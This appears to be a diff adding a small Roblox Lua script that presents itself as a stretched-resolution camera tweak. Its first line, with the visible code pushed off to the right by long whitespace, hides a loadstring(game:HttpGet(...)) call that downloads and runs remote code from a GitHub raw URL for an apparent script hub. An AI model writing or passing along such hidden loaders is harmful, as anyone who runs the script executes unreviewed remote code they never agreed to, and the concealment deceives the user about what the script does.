@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Heitor946/VentisHub.lua/main/VentisHub"))()               local Camera = workspace.CurrentCamera
+local Resolution = 0.65  -- 1 = Normal Resolution
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, Resolution, 0, 0, 0, 1)
+end)
